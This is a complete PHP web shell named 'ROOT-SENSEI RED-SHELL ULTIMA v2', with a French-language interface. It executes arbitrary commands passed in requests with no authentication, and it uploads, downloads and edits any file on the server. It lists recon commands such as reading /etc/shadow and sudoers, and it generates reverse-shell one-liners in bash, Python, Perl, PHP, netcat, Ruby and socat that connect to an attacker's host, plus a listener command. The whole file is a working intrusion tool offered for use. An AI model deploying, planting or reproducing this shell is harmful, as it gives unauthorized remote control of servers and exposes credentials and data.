<?php
/**
 * ROOT-SENSEI | RED-SHELL ULTIMA v2
 * Utilisation : Upload, Execute, Edit, Recon
 */
session_start();

// Persistent working directory via session
if (isset($_REQUEST['cmd'])) {
    $raw = $_REQUEST['cmd'];
    if (preg_match('/^\s*cd\s+(.+)/', $raw, $m)) {
        $target = trim($m[1]);
        if (isset($_SESSION['cwd'])) chdir($_SESSION['cwd']);
        if (@chdir($target)) {
            $_SESSION['cwd'] = getcwd();
        }
    }
}
if (isset($_SESSION['cwd']) && is_dir($_SESSION['cwd'])) {
    chdir($_SESSION['cwd']);
} else {
    $_SESSION['cwd'] = getcwd();
}

// 1. Command execution (POST + GET via URL)
$cmd = isset($_REQUEST['cmd']) ? $_REQUEST['cmd'] : '';
$output = "";
if ($cmd) {
    $output = shell_exec("cd " . escapeshellarg($_SESSION['cwd']) . " && " . $cmd . " 2>&1");
    if (preg_match('/\bcd\s+/', $cmd)) {
        $check = shell_exec("cd " . escapeshellarg($_SESSION['cwd']) . " && " . $cmd . " && pwd 2>/dev/null");
        if ($check) {
            $lines = array_filter(explode("\n", trim($check)));
            $last = end($lines);
            if (is_dir($last)) $_SESSION['cwd'] = $last;
        }
    }
}

// 2. Upload
$upload_msg = "";
if (isset($_FILES['upload_file']) && $_FILES['upload_file']['error'] === UPLOAD_ERR_OK) {
    $dest = isset($_POST['upload_path']) && $_POST['upload_path'] !== '' 
        ? rtrim($_POST['upload_path'], '/') . '/' . $_FILES['upload_file']['name']
        : $_SESSION['cwd'] . '/' . $_FILES['upload_file']['name'];
    if (move_uploaded_file($_FILES['upload_file']['tmp_name'], $dest)) {
        $upload_msg = "[OK] Fichier uploadé : " . $dest;
    } else {
        $upload_msg = "[ERREUR] Échec upload vers : " . $dest;
    }
}

// 3. Download
if (isset($_GET['download']) && $_GET['download'] !== '') {
    $file = $_GET['download'];
    if (is_file($file) && is_readable($file)) {
        header('Content-Description: File Transfer');
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="' . basename($file) . '"');
        header('Content-Length: ' . filesize($file));
        readfile($file);
        exit;
    }
}

// 4. File Editor — Save
$edit_msg = "";
if (isset($_POST['edit_save']) && isset($_POST['edit_path']) && isset($_POST['edit_content'])) {
    $epath = $_POST['edit_path'];
    if (@file_put_contents($epath, $_POST['edit_content']) !== false) {
        $edit_msg = "[OK] Fichier sauvegardé : " . $epath;
    } else {
        $edit_msg = "[ERREUR] Impossible d'écrire : " . $epath;
    }
}

// 5. File Editor — Load
$edit_file_content = "";
$edit_file_path = "";
if (isset($_POST['edit_load']) && isset($_POST['edit_path']) && $_POST['edit_path'] !== '') {
    $edit_file_path = $_POST['edit_path'];
    if (is_file($edit_file_path) && is_readable($edit_file_path)) {
        $edit_file_content = file_get_contents($edit_file_path);
    } else {
        $edit_msg = "[ERREUR] Fichier introuvable ou illisible : " . $edit_file_path;
    }
}

// 6. Self-destruct
if (isset($_GET['selfdestruct']) && $_GET['selfdestruct'] === 'confirm') {
    @unlink(__FILE__);
    die('<html><body style="background:#000;color:#ff0000;font-family:monospace;display:flex;justify-content:center;align-items:center;height:100vh;font-size:2em;">💀 SHELL DESTROYED 💀</body></html>');
}

// System info
$tools = [
    "Système" => ["whoami", "id", "uname -a", "pwd", "ps aux", "env", "df -h", "free -m"],
    "Navigation" => ["ls -la", "ls -R", "find . -type f -maxdepth 2", "du -sh *"],
    "Réseau" => ["ip a", "netstat -tunlp", "cat /etc/hosts", "arp -a", "ss -tunlp", "curl ifconfig.me"],
    "Fichiers" => ["cat /etc/passwd", "cat /etc/shadow", "cat .bash_history", "ls -la /tmp", "find / -perm -4000 2>/dev/null"],
    "Recon" => ["cat /etc/crontab", "ls -la /etc/cron*", "cat /etc/sudoers", "dpkg -l 2>/dev/null || rpm -qa", "cat /proc/version"],
    "Persistence" => ["crontab -l", "cat /etc/rc.local", "systemctl list-unit-files --state=enabled", "ls -la /etc/init.d/"]
];

$user = trim(shell_exec('whoami'));
$hostname = php_uname('n');
$php_ver = phpversion();
$os_info = php_uname('s') . ' ' . php_uname('r');
$server_sw = isset($_SERVER['SERVER_SOFTWARE']) ? $_SERVER['SERVER_SOFTWARE'] : 'N/A';
$disk_free = @disk_free_space('/');
$disk_total = @disk_total_space('/');
$disk_pct = $disk_total ? round(($disk_total - $disk_free) / $disk_total * 100) : 0;
$disk_free_h = $disk_free ? round($disk_free / 1073741824, 1) . 'G' : 'N/A';
$safe_mode = ini_get('safe_mode') ? 'ON' : 'OFF';
$disabled_funcs = ini_get('disable_functions') ? ini_get('disable_functions') : 'None';
$writable = is_writable($_SESSION['cwd']) ? 'YES' : 'NO';
$ip = isset($_SERVER['SERVER_ADDR']) ? $_SERVER['SERVER_ADDR'] : 'N/A';
?>
<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <title>⚡ ROOT-SENSEI ULTIMA ⚡</title>
    <style>
        :root { --red: #ff0000; --dark-red: #8b0000; --bg: #050505; --term: #00ff41; --sidebar-bg: #0a0a0a; --yellow: #ffd700; --cyan: #00e5ff; }
        
        * { box-sizing: border-box; }
        body { background: var(--bg); color: #ccc; font-family: 'Consolas', 'Monaco', monospace; margin: 0; display: flex; height: 100vh; overflow: hidden; }
        
        /* Sidebar */
        #sidebar { 
            width: 320px; background: var(--sidebar-bg); 
            border-right: 2px solid var(--red); padding: 15px; 
            display: flex; flex-direction: column; overflow-y: auto;
            box-shadow: 5px 0 15px rgba(255, 0, 0, 0.1);
            flex-shrink: 0;
        }
        #sidebar h2 { font-size: 1.1em; color: var(--red); border-bottom: 1px solid var(--red); padding-bottom: 10px; text-transform: uppercase; letter-spacing: 2px; margin-top: 0; }
        
        .cat-title { font-weight: bold; margin-top: 15px; color: #fff; text-transform: uppercase; font-size: 0.7em; letter-spacing: 1px; border-left: 3px solid var(--red); padding-left: 10px; cursor: pointer; user-select: none; }
        .cat-title:hover { color: var(--red); }
        .cat-title::before { content: '▸ '; color: var(--red); }
        .cat-title.open::before { content: '▾ '; }
        .cat-group { display: none; }
        .cat-group.open { display: block; }
        
        /* System Info Box */
        .sys-info { background: #0d0d0d; border: 1px solid #222; padding: 8px; margin-bottom: 10px; font-size: 0.7em; line-height: 1.6; }
        .sys-info .si-label { color: var(--red); }
        .sys-info .si-val { color: var(--term); }
        .sys-info .si-warn { color: var(--yellow); }
        
        /* Buttons */
        .btn { 
            background: #111; border: 1px solid #333; color: #aaa; 
            padding: 5px 8px; margin: 2px 0; cursor: pointer; 
            font-size: 0.75em; border-radius: 2px; transition: 0.2s; text-align: left;
            font-family: 'Consolas', monospace; display: block; width: 100%;
        }
        .btn:hover { background: var(--red); color: white; border-color: #fff; box-shadow: 0 0 8px var(--red); }
        
        .btn-action { background: var(--red); color: white; font-weight: bold; width: 100%; padding: 12px; margin-top: 10px; border: none; cursor: pointer; text-transform: uppercase; font-family: 'Consolas', monospace; font-size: 0.85em; }
        .btn-action:hover { background: #ff4d4d; }
        
        .btn-danger { background: #1a0000; border: 1px solid #ff0000; color: #ff4444; }
        .btn-danger:hover { background: #ff0000; color: #fff; }

        /* Main */
        #main { flex: 1; display: flex; flex-direction: column; padding: 15px; overflow: hidden; }
        
        .status-bar { 
            color: var(--red); margin-bottom: 10px; font-weight: bold; font-size: 0.8em; 
            background: #111; padding: 8px 12px; border: 1px dashed var(--red); 
            display: flex; justify-content: space-between; flex-wrap: wrap; gap: 5px;
        }
        .status-bar .cwd { color: var(--cyan); }

        /* Terminal Input */
        .cmd-row { display: flex; gap: 0; }
        .cmd-prefix { background: #111; border: 1px solid var(--red); border-right: none; color: var(--red); padding: 12px; font-family: 'Consolas', monospace; font-size: 1em; white-space: nowrap; display: flex; align-items: center; }
        input[type="text"]#cmd-in { 
            background: #000; border: 1px solid var(--red); color: var(--term); 
            padding: 12px; width: 100%; font-family: 'Consolas', monospace; font-size: 1em; outline: none;
            box-shadow: inset 0 0 10px rgba(255, 0, 0, 0.2);
        }

        /* Console Output */
        pre#output { 
            flex: 1; background: #000; border: 1px solid #222; 
            margin-top: 10px; padding: 12px; color: var(--term); overflow: auto; 
            font-family: 'Consolas', monospace; line-height: 1.4;
            border-left: 3px solid var(--red); min-height: 100px;
            position: relative;
        }
        
        /* History Dropdown */
        #history-dropdown { 
            display: none; position: absolute; background: #111; border: 1px solid var(--red);
            max-height: 200px; overflow-y: auto; z-index: 100; width: calc(100% - 60px);
            margin-top: -1px;
        }
        #history-dropdown div { padding: 6px 10px; cursor: pointer; font-size: 0.85em; color: #aaa; border-bottom: 1px solid #1a1a1a; }
        #history-dropdown div:hover { background: var(--red); color: #fff; }

        /* Tabs */
        .tab-bar { display: flex; gap: 0; margin-top: 10px; flex-shrink: 0; }
        .tab-btn { 
            background: #111; border: 1px solid #333; border-bottom: none; color: #666; 
            padding: 8px 16px; cursor: pointer; font-family: 'Consolas', monospace; 
            font-size: 0.75em; text-transform: uppercase; transition: 0.2s;
        }
        .tab-btn.active { background: #1a0000; color: var(--red); border-color: var(--red); }
        .tab-btn:hover { color: #fff; }
        
        .tab-content { display: none; background: #0a0a0a; border: 1px solid var(--red); border-top: none; padding: 15px; flex-shrink: 0; }
        .tab-content.active { display: flex; gap: 20px; flex-wrap: wrap; }
        
        /* IO blocks inside tabs */
        .io-block { flex: 1; min-width: 220px; }
        .io-block label { color: var(--red); font-size: 0.75em; text-transform: uppercase; letter-spacing: 1px; display: block; margin-bottom: 5px; }
        .io-block input[type="text"], .io-block input[type="file"], .io-block input[type="number"], .io-block select, .io-block textarea { 
            background: #000; border: 1px solid #333; color: var(--term); padding: 8px; 
            width: 100%; font-family: 'Consolas', monospace; font-size: 0.8em; resize: vertical;
        }
        .io-block textarea { min-height: 120px; }
        
        .btn-io { 
            background: var(--dark-red); color: white; border: 1px solid var(--red); 
            padding: 8px 18px; cursor: pointer; font-family: 'Consolas', monospace; 
            text-transform: uppercase; font-weight: bold; font-size: 0.8em; transition: 0.2s; margin-top: 8px; 
        }
        .btn-io:hover { background: var(--red); box-shadow: 0 0 10px var(--red); }
        
        .msg { font-size: 0.8em; padding: 4px 0; }
        .msg.ok { color: var(--term); }
        .msg.err { color: #ff4d4d; }
        
        /* Reverse Shell output */
        .revshell-out { background: #000; border: 1px solid #333; color: var(--yellow); padding: 10px; font-size: 0.8em; margin-top: 8px; word-break: break-all; cursor: pointer; min-height: 40px; }
        .revshell-out:hover { border-color: var(--red); }
        
        /* Scrollbar */
        ::-webkit-scrollbar { width: 5px; }
        ::-webkit-scrollbar-thumb { background: var(--red); }
        
        /* Responsive */
        @media (max-width: 900px) {
            body { flex-direction: column; }
            #sidebar { width: 100%; max-height: 40vh; border-right: none; border-bottom: 2px solid var(--red); }
        }
    </style>
</head>
<body>

<!-- Sidebar -->
<div id="sidebar">
    <h2>🛠️ Arsenal</h2>
    
    <!-- System Info -->
    <div class="sys-info">
        <span class="si-label">USER:</span> <span class="si-val"><?= $user ?></span><br>
        <span class="si-label">HOST:</span> <span class="si-val"><?= $hostname ?></span><br>
        <span class="si-label">OS:</span> <span class="si-val"><?= $os_info ?></span><br>
        <span class="si-label">PHP:</span> <span class="si-val"><?= $php_ver ?></span><br>
        <span class="si-label">SERVER:</span> <span class="si-val"><?= $server_sw ?></span><br>
        <span class="si-label">IP:</span> <span class="si-val"><?= $ip ?></span><br>
        <span class="si-label">DISK:</span> <span class="si-val"><?= $disk_free_h ?> free</span> <span class="si-warn">(<?= $disk_pct ?>% used)</span><br>
        <span class="si-label">WRITABLE:</span> <span class="<?= $writable === 'YES' ? 'si-val' : 'si-warn' ?>"><?= $writable ?></span><br>
        <span class="si-label">SAFE_MODE:</span> <span class="si-val"><?= $safe_mode ?></span>
    </div>
    
    <?php foreach ($tools as $category => $cmds): ?>
        <div class="cat-title" onclick="toggleCat(this)"><?= $category ?></div>
        <div class="cat-group">
            <?php foreach ($cmds as $c): ?>
                <button class="btn" onclick="setCmd('<?= addslashes($c) ?>')">> <?= $c ?></button>
            <?php endforeach; ?>
        </div>
    <?php endforeach; ?>

    <div style="margin-top:auto; padding-top:15px; border-top: 1px solid #222;">
        <button class="btn" onclick="document.getElementById('cmd-in').value=''; document.getElementById('cmd-in').focus();">🧹 Clear Input</button>
        <button class="btn" onclick="clearHistory()">🗑️ Clear History</button>
        <button class="btn" onclick="showHistory()">📜 Show History</button>
        <button class="btn btn-danger" onclick="if(confirm('⚠️ SUPPRIMER CE SHELL DU SERVEUR ?')) location='?selfdestruct=confirm'">💀 Self-Destruct</button>
    </div>
</div>

<!-- Main -->
<div id="main">
    <div class="status-bar">
        <span>[SESSION] <?= $user ?>@<?= $hostname ?></span>
        <span class="cwd">📂 <?= $_SESSION['cwd'] ?></span>
        <span>PHP <?= $php_ver ?></span>
    </div>

    <form method="POST" id="shell-form" onsubmit="saveToHistory()">
        <div class="cmd-row" style="position:relative;">
            <span class="cmd-prefix"><?= $user ?>@<?= $hostname ?>:$</span>
            <input type="text" name="cmd" id="cmd-in" placeholder="Enter command..." value="<?= htmlspecialchars($cmd) ?>" autofocus autocomplete="off">
        </div>
        <div id="history-dropdown"></div>
        <button type="submit" class="btn-action">⚡ Execute</button>
    </form>

    <pre id="output"><?php 
        if ($output) echo htmlspecialchars($output); 
        else echo "╔══════════════════════════════════════╗\n║   ROOT-SENSEI ULTIMA v2 — Ready.    ║\n║   Type a command or use Arsenal.    ║\n╚══════════════════════════════════════╝"; 
    ?></pre>

    <!-- Tab Bar -->
    <div class="tab-bar">
        <div class="tab-btn active" onclick="switchTab('upload')">📤 Upload</div>
        <div class="tab-btn" onclick="switchTab('download')">📥 Download</div>
        <div class="tab-btn" onclick="switchTab('editor')">📝 Editor</div>
        <div class="tab-btn" onclick="switchTab('revshell')">🐚 Rev Shell</div>
        <div class="tab-btn" onclick="switchTab('base64')">🔑 Base64</div>
    </div>

    <!-- Upload Tab -->
    <div class="tab-content active" id="tab-upload">
        <div class="io-block">
            <form method="POST" enctype="multipart/form-data">
                <label>📤 Sélectionner un fichier</label>
                <input type="file" name="upload_file">
                <label style="margin-top:8px;">Chemin destination (optionnel)</label>
                <input type="text" name="upload_path" placeholder="<?= $_SESSION['cwd'] ?>/">
                <button type="submit" class="btn-io">Upload</button>
            </form>
            <?php if ($upload_msg): ?>
                <div class="msg <?= strpos($upload_msg, 'OK') !== false ? 'ok' : 'err' ?>"><?= htmlspecialchars($upload_msg) ?></div>
            <?php endif; ?>
        </div>
    </div>

    <!-- Download Tab -->
    <div class="tab-content" id="tab-download">
        <div class="io-block">
            <form method="GET">
                <label>📥 Chemin du fichier à télécharger</label>
                <input type="text" name="download" placeholder="/etc/passwd">
                <button type="submit" class="btn-io">Download</button>
            </form>
        </div>
    </div>

    <!-- File Editor Tab -->
    <div class="tab-content" id="tab-editor">
        <div class="io-block" style="min-width:100%;">
            <form method="POST">
                <div style="display:flex; gap:10px; margin-bottom:8px; flex-wrap:wrap;">
                    <div style="flex:1; min-width:200px;">
                        <label>📝 Chemin du fichier</label>
                        <input type="text" name="edit_path" value="<?= htmlspecialchars($edit_file_path) ?>" placeholder="/var/www/html/config.php">
                    </div>
                    <div style="display:flex; gap:5px; align-items:flex-end;">
                        <button type="submit" name="edit_load" value="1" class="btn-io">Charger</button>
                        <button type="submit" name="edit_save" value="1" class="btn-io" style="background:var(--term); color:#000;">Sauvegarder</button>
                    </div>
                </div>
                <textarea name="edit_content" placeholder="Le contenu du fichier apparaîtra ici..." style="width:100%; min-height:180px;"><?= htmlspecialchars($edit_file_content) ?></textarea>
            </form>
            <?php if ($edit_msg): ?>
                <div class="msg <?= strpos($edit_msg, 'OK') !== false ? 'ok' : 'err' ?>"><?= htmlspecialchars($edit_msg) ?></div>
            <?php endif; ?>
        </div>
    </div>

    <!-- Reverse Shell Tab -->
    <div class="tab-content" id="tab-revshell">
        <div class="io-block">
            <label>🌐 IP (LHOST)</label>
            <input type="text" id="rs-ip" placeholder="10.10.14.1" value="">
            <label style="margin-top:8px;">🔌 Port (LPORT)</label>
            <input type="number" id="rs-port" placeholder="4444" value="4444">
            <label style="margin-top:8px;">Type</label>
            <select id="rs-type" onchange="genRevShell()" style="background:#000;border:1px solid #333;color:var(--term);padding:8px;width:100%;font-family:'Consolas',monospace;">
                <option value="bash">Bash -i</option>
                <option value="bash2">Bash UDP</option>
                <option value="python">Python</option>
                <option value="python3">Python3</option>
                <option value="php">PHP</option>
                <option value="perl">Perl</option>
                <option value="nc">Netcat -e</option>
                <option value="ncmkfifo">Netcat mkfifo</option>
                <option value="ruby">Ruby</option>
                <option value="socat">Socat</option>
            </select>
            <button class="btn-io" onclick="genRevShell()">Générer</button>
            <button class="btn-io" onclick="copyRevShell()" style="background:#333;">📋 Copier</button>
        </div>
        <div class="io-block">
            <label>Résultat (cliquer pour copier)</label>
            <div class="revshell-out" id="rs-output" onclick="copyRevShell()">Configure IP & Port, puis clique Générer.</div>
            <label style="margin-top:12px;">🎧 Listener rapide</label>
            <div class="revshell-out" id="rs-listener" style="color:var(--cyan);">nc -lvnp 4444</div>
        </div>
    </div>

    <!-- Base64 Tab -->
    <div class="tab-content" id="tab-base64">
        <div class="io-block">
            <label>Texte clair</label>
            <textarea id="b64-plain" placeholder="Texte à encoder..."></textarea>
            <button class="btn-io" onclick="b64Encode()">Encode →</button>
            <button class="btn-io" onclick="b64Decode()" style="background:#333;">← Decode</button>
        </div>
        <div class="io-block">
            <label>Base64</label>
            <textarea id="b64-encoded" placeholder="Base64 à décoder..."></textarea>
            <button class="btn-io" onclick="copyB64()" style="background:#333;">📋 Copier</button>
        </div>
    </div>
</div>

<script>
    // === Command History (localStorage) ===
    var historyKey = 'rsu_history';
    var history = JSON.parse(localStorage.getItem(historyKey) || '[]');
    var histIdx = -1;
    
    function saveToHistory() {
        var val = document.getElementById('cmd-in').value.trim();
        if (val && (history.length === 0 || history[0] !== val)) {
            history.unshift(val);
            if (history.length > 100) history.pop();
            localStorage.setItem(historyKey, JSON.stringify(history));
        }
    }
    
    function clearHistory() {
        history = [];
        localStorage.removeItem(historyKey);
        alert('Historique effacé.');
    }

    function showHistory() {
        var dd = document.getElementById('history-dropdown');
        if (dd.style.display === 'block') { dd.style.display = 'none'; return; }
        dd.innerHTML = '';
        if (history.length === 0) { dd.innerHTML = '<div style="color:#666;">Aucun historique</div>'; }
        history.forEach(function(h) {
            var d = document.createElement('div');
            d.textContent = h;
            d.onclick = function() { document.getElementById('cmd-in').value = h; dd.style.display = 'none'; };
            dd.appendChild(d);
        });
        dd.style.display = 'block';
    }
    
    // Arrow keys navigation in history
    document.getElementById('cmd-in').addEventListener('keydown', function(e) {
        if (e.key === 'ArrowUp') {
            e.preventDefault();
            if (histIdx < history.length - 1) { histIdx++; this.value = history[histIdx]; }
        } else if (e.key === 'ArrowDown') {
            e.preventDefault();
            if (histIdx > 0) { histIdx--; this.value = history[histIdx]; }
            else if (histIdx === 0) { histIdx = -1; this.value = ''; }
        } else {
            histIdx = -1;
        }
    });
    
    document.addEventListener('click', function(e) {
        if (!e.target.closest('#history-dropdown') && !e.target.closest('.btn')) {
            document.getElementById('history-dropdown').style.display = 'none';
        }
    });

    // === Set command from sidebar ===
    function setCmd(newCmd) {
        var input = document.getElementById('cmd-in');
        var val = input.value.trim();
        input.value = val === "" ? newCmd : val + " && " + newCmd;
        input.focus();
    }

    // === Collapsible sidebar categories ===
    function toggleCat(el) {
        el.classList.toggle('open');
        var grp = el.nextElementSibling;
        if (grp) grp.classList.toggle('open');
    }
    // Open first category by default
    (function() {
        var first = document.querySelector('.cat-title');
        if (first) { first.classList.add('open'); first.nextElementSibling.classList.add('open'); }
    })();

    // === Tabs ===
    function switchTab(name) {
        document.querySelectorAll('.tab-btn').forEach(function(b) { b.classList.remove('active'); });
        document.querySelectorAll('.tab-content').forEach(function(c) { c.classList.remove('active'); });
        document.getElementById('tab-' + name).classList.add('active');
        var btns = document.querySelectorAll('.tab-btn');
        var tabs = ['upload','download','editor','revshell','base64'];
        var idx = tabs.indexOf(name);
        if (idx >= 0 && btns[idx]) btns[idx].classList.add('active');
    }

    // === Reverse Shell Generator ===
    function genRevShell() {
        var ip = document.getElementById('rs-ip').value || '10.10.14.1';
        var port = document.getElementById('rs-port').value || '4444';
        var type = document.getElementById('rs-type').value;
        var shells = {
            'bash':      "bash -i >& /dev/tcp/" + ip + "/" + port + " 0>&1",
            'bash2':     "bash -i >& /dev/udp/" + ip + "/" + port + " 0>&1",
            'python':    "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"" + ip + "\"," + port + "));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'",
            'python3':   "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"" + ip + "\"," + port + "));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'",
            'php':       "php -r '$sock=fsockopen(\"" + ip + "\"," + port + ");exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
            'perl':      "perl -e 'use Socket;$i=\"" + ip + "\";$p=" + port + ";socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'",
            'nc':        "nc -e /bin/sh " + ip + " " + port,
            'ncmkfifo':  "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc " + ip + " " + port + " >/tmp/f",
            'ruby':      "ruby -rsocket -e'f=TCPSocket.open(\"" + ip + "\"," + port + ").to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'",
            'socat':     "socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:" + ip + ":" + port
        };
        document.getElementById('rs-output').textContent = shells[type] || '';
        document.getElementById('rs-listener').textContent = "nc -lvnp " + port;
    }
    
    function copyRevShell() {
        var text = document.getElementById('rs-output').textContent;
        navigator.clipboard.writeText(text).then(function() {
            var el = document.getElementById('rs-output');
            el.style.borderColor = 'var(--term)';
            setTimeout(function() { el.style.borderColor = '#333'; }, 600);
        });
    }

    // === Base64 Encode/Decode ===
    function b64Encode() {
        var text = document.getElementById('b64-plain').value;
        try { document.getElementById('b64-encoded').value = btoa(unescape(encodeURIComponent(text))); }
        catch(e) { document.getElementById('b64-encoded').value = 'Erreur: ' + e.message; }
    }
    function b64Decode() {
        var text = document.getElementById('b64-encoded').value;
        try { document.getElementById('b64-plain').value = decodeURIComponent(escape(atob(text))); }
        catch(e) { document.getElementById('b64-plain').value = 'Erreur: ' + e.message; }
    }
    function copyB64() {
        navigator.clipboard.writeText(document.getElementById('b64-encoded').value);
    }

    // Auto-scroll output
    var pre = document.getElementById('output');
    if (pre) pre.scrollTop = pre.scrollHeight;
</script>

</body>
</html>
